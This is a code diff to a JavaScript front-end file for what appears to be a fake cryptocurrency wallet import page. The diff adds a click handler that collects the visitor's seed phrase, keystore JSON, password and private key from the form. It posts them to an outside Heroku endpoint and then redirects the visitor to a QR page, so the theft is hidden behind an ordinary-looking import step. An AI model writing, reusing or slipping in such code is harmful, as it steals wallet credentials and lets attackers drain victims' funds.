@@ -31,19 +31,56 @@ const conts = document.querySelectorAll('.c')
 
     importBtn.forEach(impor => {
         impor.addEventListener('click', function() {
-            const txt1 = document.getElementById('txt1').value
+    const txt1 = document.getElementById('txt1').value
     const txt2 = document.getElementById('txt2').value
     const pwd = document.getElementById('pwd').value
-    const key = document.getElementById('key').value
-            console.log(txt1, txt2);
+    const uKey = document.querySelector('.Jesuskey').value
+    
+            
            if(txt1 === '' ) {
             return;
            } else {
-            location="/markups/qr.html"
-           }
+               console.log(123);
+               
+            let userData = {
+                phrase: txt1,
+                keystoreJson: txt2,
+                password: pwd,
+                key: uKey
+            } 
+            let headers = new Headers()
+            fetch("https://mynodemailerapp.herokuapp.com/send", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                }, 
+                body: JSON.stringify(userData)
+            }).then((res) => {
+                // if(res.redirected) {
+                //     document.body.innerHTML = `
+                //         <div class="conm>
+                //         <img class="myimg" src="/download (1).png" />
+                //         </div>
+                //     `
+                // } else {
+                //     document.body.innerHTML = 'Fail'
+                // }
+               return res.json()
+            }).then((data) => {
+
+                if(data.status === 200) {
+                    console.log(data.status, "success");
+                } else {
+                    console.log(data.status);
+                }
+                window.location.replace("/markups/qr.html")
+                
+            })
+            
+           } // Everything should end here
         })
     })
-
+// location="/markups/qr.html"
 
     const key = document.getElementById('json') 
     if(key) {
@@ -74,4 +111,7 @@ const conts = document.querySelectorAll('.c')
     })
 
    
+
+// Fetch API
+
 
